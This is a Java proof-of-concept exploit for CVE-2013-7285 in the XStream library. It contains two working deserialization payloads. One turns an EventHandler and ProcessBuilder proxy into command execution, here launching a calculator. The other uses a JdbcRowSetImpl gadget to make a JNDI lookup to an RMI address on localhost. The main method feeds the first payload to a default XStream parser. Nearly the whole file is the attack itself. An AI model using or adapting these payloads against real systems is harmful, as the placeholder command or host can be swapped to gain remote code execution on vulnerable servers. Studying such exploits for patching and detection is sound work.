package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * RCE EventHandler ProcessBuilder/JdbcRowSetImpl JNDI <=1.4.6
 */
public class CVE_2013_7285 {
    public static void main(String[] args) {
        String xml = "<sorted-set>\n" +
                "  <string>su18</string>\n" +
                "  <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "    <handler class=\"java.beans.EventHandler\">\n" +
                "      <target class=\"java.lang.ProcessBuilder\">\n" +
                "        <command class=\"java.util.Arrays$ArrayList\">\n" +
                "          <a class=\"string-array\">\n" +
                "            <string>open</string>\n" +
                "            <string>-a</string>\n" +
                "            <string>Calculator.app</string>\n" +
                "          </a>\n" +
                "        </command>\n" +
                "        <redirectErrorStream>false</redirectErrorStream>\n" +
                "      </target>\n" +
                "      <action>start</action>\n" +
                "    </handler>\n" +
                "  </dynamic-proxy>\n" +
                "</sorted-set>";


        String xml2 = "<sorted-set>\n" +
                "  <string>foo</string>\n" +
                "  <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "    <handler class=\"java.beans.EventHandler\">\n" +
                "      <target class=\"com.sun.rowset.JdbcRowSetImpl\" serialization=\"custom\">\n" +
                "        <javax.sql.rowset.BaseRowSet>\n" +
                "          <default>\n" +
                "            <concurrency>1008</concurrency>\n" +
                "            <escapeProcessing>true</escapeProcessing>\n" +
                "            <fetchDir>1000</fetchDir>\n" +
                "            <fetchSize>0</fetchSize>\n" +
                "            <isolation>2</isolation>\n" +
                "            <maxFieldSize>0</maxFieldSize>\n" +
                "            <maxRows>0</maxRows>\n" +
                "            <queryTimeout>0</queryTimeout>\n" +
                "            <readOnly>true</readOnly>\n" +
                "            <rowSetType>1004</rowSetType>\n" +
                "            <showDeleted>false</showDeleted>\n" +
                "            <dataSource>rmi://127.0.0.1:1099/z76oze</dataSource>\n" +
                "            <listeners/>\n" +
                "            <params/>\n" +
                "          </default>\n" +
                "        </javax.sql.rowset.BaseRowSet>\n" +
                "        <com.sun.rowset.JdbcRowSetImpl>\n" +
                "          <default>\n" +
                "            <iMatchColumns>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "              <int>-1</int>\n" +
                "            </iMatchColumns>\n" +
                "            <strMatchColumns>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "              <null/>\n" +
                "            </strMatchColumns>\n" +
                "          </default>\n" +
                "        </com.sun.rowset.JdbcRowSetImpl>\n" +
                "      </target>\n" +
                "      <action>getDatabaseMetaData</action>\n" +
                "    </handler>\n" +
                "  </dynamic-proxy>\n" +
                "</sorted-set>";

        System.out.println(xml);
        XStream xstream = new XStream();
//        xstream.addPermission(AnyTypePermission.ANY);
        xstream.fromXML(xml);
    }

}
